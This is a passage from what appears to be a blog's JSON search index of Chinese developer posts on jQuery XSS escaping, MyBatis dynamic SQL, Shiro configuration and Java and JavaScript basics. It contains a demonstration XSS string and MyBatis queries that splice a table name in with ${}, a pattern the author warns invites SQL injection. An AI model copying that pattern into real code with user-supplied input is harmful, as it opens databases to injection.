&quot;&quot;&gt;&lt;&#x2F;div&gt;&#39; + &#39;&lt;&#x2F;div&gt;&#39; ); 这就会产生一个问题 好多XSS都是这么产生的 使用JQuery防止XSS为了防止XSS，而且拼接HTML字符串是在是太无语了，感觉笨笨的 JQuery 1.4 可以通过函数拼接HMTL标签并且防止XSS 这个函数是 jQuery( html, attributes ) 在1.4之后加入JQuery 1$(&quot;&lt;div&gt;&quot;,&#123;id:&quot;point&quot;,class:&quot;blank&quot;&#125;).appendTo($dom) 这样就会产生一个 1&lt;div id&#x3D;&quot;point&quot; class&#x3D;&quot;blank&quot;&gt;&lt;&#x2F;div&gt; 的DOM节点，并且使用appendTo被拼接到某个dom后边，即使在class里故意填入XSS代码，也会被Escape成内容防止XSS产生 123var xss &#x3D; &#39;&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;&#39;var attr &#x3D; &#123;class:xss&#125;$(&#39;&lt;option&gt;&#39;,attr).appendTo($dom) 大量DOM操作虽然使用JQuery可以防止XSS，但是如果遇见大面积的DOM操作，还是比较麻烦的，特别是在Table里循环接收tr的时。不仅可读性差，而且不好操作。 前端的大量DOM操作一直都是一个比较纠结的问题，我查了一些解决方案，AngularJS，React等等，都感觉太复杂了，而且文件都比较大，其实React是一个比较好的方案，毕竟是Facebook的看家本领，但是学习曲线又太高，最后我发现了一个叫Riot的库，它专门批判了一翻React来表扬自己，确实挺好用的，功能比较简单，而且兼容其它的前端库 具体方案可以参考[Riot API][]或者我的简单教程。","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"HTML","slug":"HTML","permalink":"http://yoursite.com/tags/HTML/"}]},{"title":"MyBatis动态语句:参数传递和传递表名","date":"2016-09-03T02:00:00.000Z","path":"2016/09/03/MyBatis动态语句参数传递和传递表名/","text":"通过参数传递表名在文章返回类型中，我们举例通过传入表名或者总行数 123&lt;select id&#x3D;&quot;selectCountFromTable&quot; parameterType&#x3D;&quot;java.lang.String&quot; resultType&#x3D;&quot;java.lang.Integer&quot;&gt; SELECT count(*) FROM $&#123;table&#125;&lt;&#x2F;select&gt; 期间遇到了两个小问题 字符串的传递的两种方法第一版SQL语句我使用了 12&#x2F;&#x2F;第一版错误语句SELECT count(*) FROM #&#123;param1&#125; 发现SQL语句执行失败，因为执行的是 1SELECT count(*) FROM &quot;tableName&quot; 在拼接SQL的时候 参数name被作为字符串填入了自动加了双引号 所以语句发生错误，造成SQL执行失败，解决方案是使用dollar符号 12／&#x2F;第二版错误语句SELECT count(*) FROM $&#123;param1&#125; 传递方法 效果 #{name} 会自动加上双引号，进行变量绑定，且可以使用jdbcType=？设定类型 ${name} 将某个变量直接作为SQL语句的一部分进行拼接，慎用！！容易引起SQL注入 异常There is no getter在使用了第二版错误语句时，执行SQL会丢出一个异常 1org.apache.ibatis.reflection.ReflectionException: There is no getter for property named &#39;param1&#39; in &#39;class java.lang.String&#39; 说param1没有getter方法，根据在文章多参数自定义插件中提到了多参数传递的可能性 使用param1代表参数一，以此类推，比如param1.id 就是对param1中的id变量使用Getter方法 MyBatis代参数在默认情况下是根据Getter方法取值的，所以为了避开使用Getter参数取值，使用@Param注解给定一个参数名即可 12345&#x2F;&#x2F;DOMapper.java中int selectCountFromTable(@Param(&quot;table&quot;) String table);&#x2F;&#x2F;DOMapper.xml中SELECT count(*) FROM $&#123;table&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"MyBatis动态语句:返回类型和返回Int类型","date":"2016-09-03T01:00:00.000Z","path":"2016/09/03/MyBatis动态语句返回类型和返回Int类型/","text":"返回类型在MyBatis的动态语句中，决定返回类型的字段是 resultMap: 决定返回的Object映射对象 resultType: 决定返回的对象 在MyBatis Generate自动生成的DOMapper.xml中，一般会有一个 BaseResultMap 的 resultMap 12345&lt;resultMap id&#x3D;&quot;BaseResultMap&quot; type&#x3D;&quot;com.project.dal.model.ObjectDO&quot; &gt; &lt;id column&#x3D;&quot;id&quot; property&#x3D;&quot;id&quot; jdbcType&#x3D;&quot;INTEGER&quot; &#x2F;&gt; &lt;result column&#x3D;&quot;object_id&quot; property&#x3D;&quot;objectId&quot; jdbcType&#x3D;&quot;INTEGER&quot; &#x2F;&gt; &lt;result column&#x3D;&quot;object_name&quot; property&#x3D;&quot;objectName&quot; jdbcType&#x3D;&quot;VARCHAR&quot; &#x2F;&gt;&lt;&#x2F;resultMap&gt; 可以将MySQL的select出来的表格column的每一个字段转化成某个ObjectDO的内部变量，只需要在SQL动态语句中设定resultMap就可以得到具体的Object对象 123&lt;select id&#x3D;&quot;selectByKey&quot; resultMap&#x3D;&quot;BaseResultMap&quot; &gt; .... &lt;&#x2F;select&gt; 返回基本类型如果想返回某个特定的类型，就比较简单了，直接设定resultType即可，比如我想设定一个返回Int类型的函数 1int selectCountFromTable(@Param(&quot;table&quot;) String table); 只需要设定 resultType=”java.lang.Integer” 123&lt;select id&#x3D;&quot;selectCountFromTable&quot; parameterType&#x3D;&quot;java.lang.String&quot; resultType&#x3D;&quot;java.lang.Integer&quot;&gt; SELECT count(*) FROM $&#123;table&#125;&lt;&#x2F;select&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"MyBatis自定义插件:BaseResult添加映射","date":"2016-09-02T01:00:00.000Z","path":"2016/09/02/MyBatis自定义插件BaseResult添加映射/","text":"BaseResult中添加映射在文章DO模型添加变量中我们讲解了如何通过MyBaitsGenerate自定义插件为DO模型添加变量，然后根据SQL语句不同，我们还要在BaseResult中添加好相应的对应，才能从SQL的结果中获得正确的值 重写接口能够获得BaseResult的接口是 sqlMapResultMapWithoutBLOBsElementGenerated 12345678910@Overridepublic boolean sqlMapResultMapWithoutBLOBsElementGenerated(XmlElement element, IntrospectedTable introspectedTable) &#123; &#x2F;&#x2F;Column Number XmlElement resultElement &#x3D; new XmlElement(&quot;result&quot;); resultElement.addAttribute(new Attribute(&quot;column&quot;,&quot;column_count&quot;)); resultElement.addAttribute(new Attribute(&quot;property&quot;,&quot;columnCount&quot;)); resultElement.addAttribute(new Attribute(&quot;jdbcType&quot;,&quot;INTEGER&quot;)); element.addElement(resultElement); return super.sqlMapResultMapWithoutBLOBsElementGenerated(element, introspectedTable);&#125; 其中入参 element 就是resultMap节点，直接对其进行addElement添加一个result的Element即可 123&lt;resultMap id&#x3D;&quot;BaseResultMap&quot; type&#x3D;&quot;com.bestpay.psas.dal.model.bug.BugCategoryDO&quot; &gt;....&lt;&#x2F;resultMap&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"MyBatis自定义插件:DO模型添加变量","date":"2016-09-02T01:00:00.000Z","path":"2016/09/02/MyBatis自定义插件DO模型添加变量/","text":"自定义插件DO添加变量在文章MyBatisGenerate自定义插件我们讲到了简单的修改DOMapper的Java和XML函数，并没有给出如何为DO模型添加变量 重写接口重写接口 modelBaseRecordClassGenerated 可以对DO模型进行操作 123456@Overridepublic boolean modelBaseRecordClassGenerated(TopLevelClass topLevelClass, IntrospectedTable introspectedTable) &#123; addTargetField(topLevelClass,&quot;columnCount&quot;,Integer.class); addTargetField(topLevelClass,&quot;key&quot;,String.class); return super.modelBaseRecordClassGenerated(topLevelClass, introspectedTable);&#125; 其中 addTargetField 如下 12345678910private void addTargetField(TopLevelClass topLevelClass, String name, Class clazz) &#123; FullyQualifiedJavaType fieldType &#x3D; new FullyQualifiedJavaType(clazz.getName()); Field field &#x3D; new Field(name,fieldType); field.setVisibility(JavaVisibility.PRIVATE); topLevelClass.addField(field); topLevelClass.addImportedType(field.getType()); &#x2F;&#x2F;添加Getter Setter方法 topLevelClass.addMethod(getJavaBeansGetter(name,fieldType)); topLevelClass.addMethod(getJavaBeansSetter(name,fieldType));&#125; 拼接Getter和Setter方法由于 topLevelClass.addField() 仅仅添加了Filed变量本身，并不会添加Getter和Setter方法，所以说Getter和Setter还要自己写，(╯°Д°）╯︵ /(.□ . \\) 这尼玛太坑了，通过读MyBatisGenerate源码我大致Copy了一份，用到了MyBatisGenerate中的JavaBeansUtil 1234567891011121314151617181920212223242526272829303132333435&#x2F;** * 添加Getter方法 * @param name 参数名 * @param type 参数类型 *&#x2F;public Method getJavaBeansGetter(String name, FullyQualifiedJavaType type) &#123; Method method &#x3D; new Method(); method.setVisibility(JavaVisibility.PUBLIC); method.setReturnType(type); method.setName(JavaBeansUtil.getGetterMethodName(name, type)); StringBuilder sb &#x3D; new StringBuilder(); sb.append(&quot;return &quot; + name + &quot;;&quot;); method.addBodyLine(sb.toString()); return method;&#125;&#x2F;** * 添加Setter方法 * @param name 参数名 * @param type 参数类型 *&#x2F;public Method getJavaBeansSetter(String name, FullyQualifiedJavaType type) &#123; Method method &#x3D; new Method(); method.setVisibility(JavaVisibility.PUBLIC); method.setName(JavaBeansUtil.getSetterMethodName(name)); method.addParameter(new Parameter(type, name)); StringBuilder sb &#x3D; new StringBuilder(); sb.append(&quot;this.&quot; + name + &quot; &#x3D; &quot; + name + &quot;;&quot;); method.addBodyLine(sb.toString()); return method;&#125; 在完成了DO变量的添加之后，一定记得也要在ResultMap中设定好从SQL的数据库表单到模型的映射，不然获取不到值的，参考文章BaseResult添加映射","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"JavaScript使用毫秒数初始化Date","date":"2016-09-01T03:00:00.000Z","path":"2016/09/01/JavaScript使用毫秒数初始化Date/","text":"使用毫秒数初始化Date在文章前端后端Date的互相转化中我们提到了Java的Date是可以直接转化成JavaScript类型的Date的，实用的是toString的字符串来初始化 JSON中toString不好搞但是在AJAX传递的JSON字符串到前端Date类型过于复杂，层级太多，也很难转成 Wed Jul 06 00:00:00 CST 2016 这种字符串，所以可以直接通过毫秒数来初始化JavaScript里的Date 1var time &#x3D; new Date(timeMilli) timeMilli不能为String类型但是有时候timeMilli从Json中接到有可能因为多个空格什么的变成String类型，如果用String类型去初始化Date，会初始化失败，例如 12var timeStr &#x3D; String(bugs[0][&quot;time&quot;])var begin &#x3D; new Date(Number(timeStr)) 这里我在timeStr里转了String，所以New失败，我又加了Number","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"JavaScript求最大值和最小值","date":"2016-09-01T02:00:00.000Z","path":"2016/09/01/JavaScript求最大值和最小值/","text":"求最大值和最小值在JS中可以通过Math函数的 max 和 min，求最大值和最小值 12var max &#x3D; Math.max(2,3,5,7); &#x2F;&#x2F;max&#x3D;7var min &#x3D; Math.min(2,3,5,7); &#x2F;&#x2F;min&#x3D;2 Array中求最大值最小值如果相对Array中对元素求最大值和最小值，需要使用 Math.max.apply() 12var array &#x3D; &#123;2,3,5,6,7&#125;;var max &#x3D; Math.max.apply(null,array) 不能直接使用 1Math.max(arr) 原因是上式是相当于只给max传入了一个object为array的一个参数，是把array作为一个个体去比较的 比较的是array而不是array里的元素，所以得不到array里元素的最大值 使用Apply的原因Function.apply()是JS中类似反射的一个特性，XXX.apply是一个调用函数的方法，其参数为：apply(Function, Args)，Function为要调用的方法，Args是参数列表，当Function为null时，默认为上文 123&#x2F;&#x2F;以下两种方式相等apply(Math.max, arr)Math.max.apply(null, arr)","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"Java对List自定义排序","date":"2016-09-01T01:00:00.000Z","path":"2016/09/01/Java对List自定义排序/","text":"对List进行排序如果我有一个纯数字或者字符串的List或者数组，可以通过 Collections 和 Arrays 的 sort 函数对其进行排序，会按照由小到大或者字母表的顺序进行排列 12345678910111213&#x2F;&#x2F;数组Integer[] integers &#x3D; &#123;2,7,5,3,1&#125;;String[] strings &#x3D; &#123;&quot;watermelon&quot;,&quot;apple&quot;,&quot;orange&quot;&#125;;&#x2F;&#x2F;对数组排序Arrays.sort(integers);Arrays.sort(strings);&#x2F;&#x2F;ListList&lt;Integer&gt; integerList &#x3D; Arrays.asList(integers);List&lt;String&gt; stringList &#x3D; Arrays.asList(strings);&#x2F;&#x2F;对List进行排序Collections.sort(integerList);Collections.sort(stringList); 对Object进行排序如果不是String 而是Object怎么办 例如PersonObject如果我有一个Person的类，然后其List 想根据姓名或者年龄进行排序，有两种方法 12345class Person &#123; private String name; private Integer age;&#125; 两种排序方法 Collections.sort(List list): 可以对实现了Comparable接口的Object进行排序，上文的String和Integer使用的就是该函数 Collections.sort(List list, Comparator&lt;? super T&gt; c): 或者对某个Object T自定义一个Comparator 两者都有一个Compare相关的函数，可以返回Int值 return 1: 对象后移，一般意义上的较大的数 return -1: 对象迁移，一般意义上的较小的数 return 0: 对象位置不变，一般意义上的相等 实现Comparable1234567891011121314151617class Person implements Comparable&lt;Person&gt; &#123; .... public int compareTo(Person o) &#123; if (this.age &gt; o.age) &#123; return 1; &#125; else if (this.age &lt; o.age) &#123; return -1; &#125;else &#123; return 0; &#125; &#125;&#125;&#x2F;&#x2F;使用第一个函数排序Collections.sort(personList); 实现Comparator1234567891011121314Comparator&lt;Person&gt; comparator &#x3D; new Comparator&lt;Person&gt;() &#123; public int compare(Person o1, Person o2) &#123; if (o1.getAge() &gt; o2.getAge()) &#123; return 1; &#125; else if (o1.getAge() &lt; o2.getAge()) &#123; return -1; &#125;else &#123; return 0; &#125; &#125;&#125;;&#x2F;&#x2F;使用第二个函数排序Collections.sort(personList,comparator);","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Sort","slug":"Sort","permalink":"http://yoursite.com/tags/Sort/"}]},{"title":"Shiro的Cookie配置错误导致刷新就登出","date":"2016-08-13T17:00:00.000Z","path":"2016/08/14/Shiro的Cookie配置错误导致刷新就登出/","text":"一个奇怪错误在有一段时间我启动了服务器容器之后，用Shiro进行登陆正常，但是一旦登陆后刷新页面用户就被Shiro自动踢出了，还要重新登陆 原因在哪原因在于SecurityManager使用了自定义的Session选项 DefaultWebSessionManager 而没有设置Cookie导致的 1234567&lt;bean id&#x3D;&quot;sessionManager&quot; class&#x3D;&quot;org.apache.shiro.web.session.mgt.DefaultWebSessionManager&quot;&gt; ..... &lt;!--&lt;property name&#x3D;&quot;sessionIdCookie&quot; ref&#x3D;&quot;sessionIdCookie&quot;&#x2F;&gt;--&gt; &lt;!--&lt;property name&#x3D;&quot;sessionIdCookieEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt;--&gt; ....&lt;&#x2F;bean&gt; 配置中 sessionIdCookie 和 sessionIdCookieEnabled 被注销掉了，由于不能使用服务器容器提供的Cookie又把自己的注销掉了，根据Session与Cookie协同保持登陆状态中的原理描述，第一次登陆的时候当然正常，一旦刷新，由于没有Cookie又被当作新的链接者，所以是未登录状态。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Cookie","slug":"Cookie","permalink":"http://yoursite.com/tags/Cookie/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"},{"name":"Error","slug":"Error","permalink":"http://yoursite.com/tags/Error/"}]},{"title":"Shiro的注解需要配置在SpringMVC配置文件","date":"2016-08-13T16:00:00.000Z","path":"2016/08/14/Shiro的注解需要配置在SpringMVC配置文件/","text":"官方文档为什么错误在文章 Shiro的简介 中提到了如果想开启注解式的Shiro控制，需要将配置写在spring-mvc.xml中，而不是官方文档的 applicationContext.xml中。 本文原因已经找到，参考文章[最少依赖启动SSM][plus][plus]:http://alanli7991.github.io/2016/11/01/从空Pom文件用最少依赖配置SSM框架/ 原因是什么呢因为Spring本身仅仅是一个IOC容器，不一定提供Web服务，提供Web服务的是SpringMVC，所以官方文档仅仅是说如何和Spring集成，当然应该写在applicationContext.xml中。 但是一旦启用了SpringMVC的Web服务，Shiro在Web层的注解当然要放在spring-mvc.xml以便SpringMVC可以进行动态代理，如果写在了Spring的配置文件中，猜测和配置文件错误导致Transaction失效的原因一样，由于SpringMVC根本拿不到SecurityManager的Bean导致Shiro失效。 !!!!!原因是我猜的，错了不要打我 还有一种可能是由于SecurityManager有两个Bean可以选择，我选的是 DefaultWebSecurityManager","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"}]},{"title":"必ずあなたを守る(七):Shiro常见错误提醒","date":"2016-08-12T22:00:00.000Z","path":"2016/08/13/Shiro常见错误提醒/","text":"Shiro中的用户等级逻辑Shiro的代码层逻辑处理中一般会对不同的用户角色进行分级，在分级的过程中 大于等于某个等级 小于等于某个等级 小于某个等级 大于某个等级 是完全不同的四个概念，就如同变成的数组操作一样，一定要对边界的进行周详的考虑 Shiro中的本人验证: 平级越权平级越权是一种常见的错误，假设存在一个需求: 只能修改比自己等级低的用户的密码 如何进行判断？如果采用这种逻辑 123if (用户等级 &lt; 当前用户等级) &#123; 可以修改&#125; 会发现判断条件里是不能修改自己的密码的，因为 自己的用户等级 == 当前用户等级 如果采用 123if (用户等级 &lt;&#x3D; 当前用户等级) &#123; 可以修改&#125; 貌似可以满足需求，但是会引起一个安全问题就是: 平级越权 因为按照设计逻辑，虽然可以修改自己的密码，但是不能修改和自己同等级用户的密码，所以说以上逻辑显然不对，正确的授权判断应该是 123if (用户等级 &lt; 当前用户等级 || 用户是本人 ) &#123; 可以修改&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"}]},{"title":"必ずあなたを守る(六):完整的Shiro配置文件示例","date":"2016-08-12T21:00:00.000Z","path":"2016/08/13/完整的Shiro配置文件示例/","text":"完整的Shiro配置Shiro的配置根据采用的方法不同跨越了 Servlet的配置文件web.xml Spring的配置文件applicationContext.xml SpringMVC的配置文件spring-mvc.xml web.xml为了使基于Servlet的Shiro权限控制过滤器生效 12345678910111213&lt;filter&gt; &lt;filter-name&gt;shiroFilter&lt;&#x2F;filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;&#x2F;filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;targetFilterLifecycle&lt;&#x2F;param-name&gt; &lt;param-value&gt;true&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt;&lt;&#x2F;filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;shiroFilter&lt;&#x2F;filter-name&gt; &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;&lt;&#x2F;filter-mapping&gt; applicationContext.xml关键配置 securityManager 与 realm 均配置在该文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;!--Shiro 声明周期相关配置--&gt;&lt;bean id&#x3D;&quot;lifecycleBeanPostProcessor&quot; class&#x3D;&quot;org.apache.shiro.spring.LifecycleBeanPostProcessor&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;securityManager&quot; class&#x3D;&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt; &lt;property name&#x3D;&quot;realm&quot; ref&#x3D;&quot;sampleRealm&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;cacheManager&quot; ref&#x3D;&quot;cacheManager&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;sessionManager&quot; ref&#x3D;&quot;sessionManager&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--Shiro SecurityUtils的配置--&gt;&lt;bean class&#x3D;&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;staticMethod&quot; value&#x3D;&quot;org.apache.shiro.SecurityUtils.setSecurityManager&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;arguments&quot; ref&#x3D;&quot;securityManager&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--Shiro 过滤器通过URL匹配进行权限控制--&gt;&lt;bean id&#x3D;&quot;shiroFilter&quot; class&#x3D;&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;securityManager&quot; ref&#x3D;&quot;securityManager&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;loginUrl&quot; value&#x3D;&quot;&#x2F;login&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;successUrl&quot; value&#x3D;&quot;&#x2F;manage&#x2F;index&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;unauthorizedUrl&quot; value&#x3D;&quot;&#x2F;login&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;filters&quot;&gt; &lt;map&gt; &lt;entry key&#x3D;&quot;hasOneRole&quot; value-ref&#x3D;&quot;orLogicalRolesFilter&quot;&#x2F;&gt; &lt;&#x2F;map&gt; &lt;&#x2F;property&gt; &lt;property name&#x3D;&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; &lt;!--&#x2F;user&#x2F;**&#x2F;insert &#x3D; authc, hasOneRole[su,admin], perms[user:write]--&gt; &lt;&#x2F;value&gt; &lt;&#x2F;property&gt;&lt;&#x2F;bean&gt;&lt;!--Shiro 自定义Session相关配置--&gt;&lt;bean id&#x3D;&quot;sessionGenerate&quot; class&#x3D;&quot;org.apache.shiro.session.mgt.eis.JavaUuidSessionIdGenerator&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;sessionDAO&quot; class&#x3D;&quot;org.apache.shiro.session.mgt.eis.EnterpriseCacheSessionDAO&quot;&gt; &lt;property name&#x3D;&quot;sessionIdGenerator&quot; ref&#x3D;&quot;sessionGenerate&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;bean id&#x3D;&quot;sessionIdCookie&quot; class&#x3D;&quot;org.apache.shiro.web.servlet.SimpleCookie&quot;&gt; &lt;property name&#x3D;&quot;httpOnly&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;maxAge&quot; value&#x3D;&quot;1800000&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;name&quot; value&#x3D;&quot;shiroKey&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;bean id&#x3D;&quot;sessionValidationScheduler&quot; class&#x3D;&quot;org.apache.shiro.session.mgt.ExecutorServiceSessionValidationScheduler&quot;&gt; &lt;property name&#x3D;&quot;interval&quot; value&#x3D;&quot;1800000&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;sessionManager&quot; ref&#x3D;&quot;sessionManager&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;bean id&#x3D;&quot;sessionManager&quot; class&#x3D;&quot;org.apache.shiro.web.session.mgt.DefaultWebSessionManager&quot;&gt; &lt;property name&#x3D;&quot;sessionDAO&quot; ref&#x3D;&quot;sessionDAO&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;sessionValidationScheduler&quot; ref&#x3D;&quot;sessionValidationScheduler&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;sessionValidationSchedulerEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;sessionIdCookie&quot; ref&#x3D;&quot;sessionIdCookie&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;sessionIdCookieEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;deleteInvalidSessions&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;cacheManager&quot; ref&#x3D;&quot;cacheManager&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;globalSessionTimeout&quot; value&#x3D;&quot;1800000&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--Shiro 自定义Cache相关配置--&gt;&lt;bean id&#x3D;&quot;cacheManager&quot; class&#x3D;&quot;org.apache.shiro.cache.ehcache.EhCacheManager&quot;&gt;&lt;&#x2F;bean&gt;&lt;!--Shiro Realm相关配置--&gt;&lt;bean id&#x3D;&quot;sampleRealm&quot; class&#x3D;&quot;org.apache.shiro.realm.jdbc.JdbcRealm&quot;&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;authenticationQuery&quot; value&#x3D;&quot;SELECT password,salt FROM users WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;userRolesQuery&quot; value&#x3D;&quot;SELECT role FROM roles WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;permissionsQuery&quot; value&#x3D;&quot;SELECT permission FROM permissisons WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;permissionsLookupEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;saltStyle&quot; value&#x3D;&quot;COLUMN&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;credentialsMatcher&quot; ref&#x3D;&quot;sha512Matcher&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--Shiro 加盐Salt相关配置--&gt;&lt;bean id&#x3D;&quot;sha512Matcher&quot; class&#x3D;&quot;org.apache.shiro.authc.credential.HashedCredentialsMatcher&quot;&gt; &lt;property name&#x3D;&quot;hashAlgorithmName&quot; value&#x3D;&quot;SHA-512&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;hashIterations&quot; value&#x3D;&quot;2&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;bean id&#x3D;&quot;secureRandomNumberGenerate&quot; class&#x3D;&quot;org.apache.shiro.crypto.SecureRandomNumberGenerator&quot;&gt; &lt;property name&#x3D;&quot;defaultNextBytesSize&quot; value&#x3D;&quot;5&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--Shiro 自定义过滤器相关配置--&gt;&lt;bean id&#x3D;&quot;orLogicalRolesFilter&quot; class&#x3D;&quot;com.company.project.shiro.filter.ORLogicalRolesFilter&quot;&#x2F;&gt; spring-mvc.xml当存在SpringMVC+Spring框架时 启用注解式Shiro控制应当配置在spring-mvc.xml里 1234&lt;bean class&#x3D;&quot;org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator&quot; depends-on&#x3D;&quot;lifecycleBeanPostProcessor&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor&quot;&gt; &lt;property name&#x3D;&quot;securityManager&quot; ref&#x3D;&quot;securityManager&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"}]},{"title":"必ずあなたを守る(五):Shiro自定义filter进行URL过滤","date":"2016-08-12T20:00:00.000Z","path":"2016/08/13/Shiro自定义filter进行URL过滤/","text":"为什么要自定义filter在文章Shiro简介中列举了多种Shiro本身自带的过滤器，可以通过配置XML里的url进行权限管理，例如 过滤器名称 过滤器作用 对应Class perms 需要权限 org.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter roles 需要角色 org.apache.shiro.web.filter.authz.RolesAuthorizationFilter 可以对其传入一组数组来进行控制 1&#x2F;user&#x2F;**&#x2F;insert &#x3D; authc, roles[su,admin], perms[write,read] 但是数组之间的关系是 AND关系，可惜的是Shiro自身并没有提供 OR关系 的过滤器，可以通过自定义过滤器的形式来完成 过滤器逻辑自定过滤器需要实现AuthorizationFilter接口然后对方法 isAccessAllowed 进行重写，具体可以参考Shiro的源代码 12345678910111213141516171819202122&#x2F;** * Created by Zhuojia on 16&#x2F;5&#x2F;23. *&#x2F;public class ORLogicalRolesFilter extends AuthorizationFilter &#123; @Override protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; Subject subject &#x3D; this.getSubject(request, response); String[] rolesArray &#x3D; ((String[])mappedValue); if(rolesArray !&#x3D; null &amp;&amp; rolesArray.length !&#x3D; 0) &#123; List&lt;String&gt; roles &#x3D; CollectionUtils.asList(rolesArray); boolean[] hasRoles &#x3D; subject.hasRoles(roles); for (boolean hasRole:hasRoles) &#123; if (hasRole) &#123; return true; &#125; &#125; &#125; return false; &#125;&#125; 配置自定义过滤器在XML的配置中，基于URL进行权限控制的shiroFilter配置自定义过滤器 123456789101112131415161718192021&#x2F;&#x2F;首先在Spring中配置自定义过滤器&lt;bean id&#x3D;&quot;orLogicalRolesFilter&quot; class&#x3D;&quot;com.company.project.shiro.filter.ORLogicalRolesFilter&quot;&#x2F;&gt;&#x2F;&#x2F;然后在Shiro过滤器中配置&lt;bean id&#x3D;&quot;shiroFilter&quot; class&#x3D;&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;securityManager&quot; ref&#x3D;&quot;securityManager&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;loginUrl&quot; value&#x3D;&quot;&#x2F;login&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;successUrl&quot; 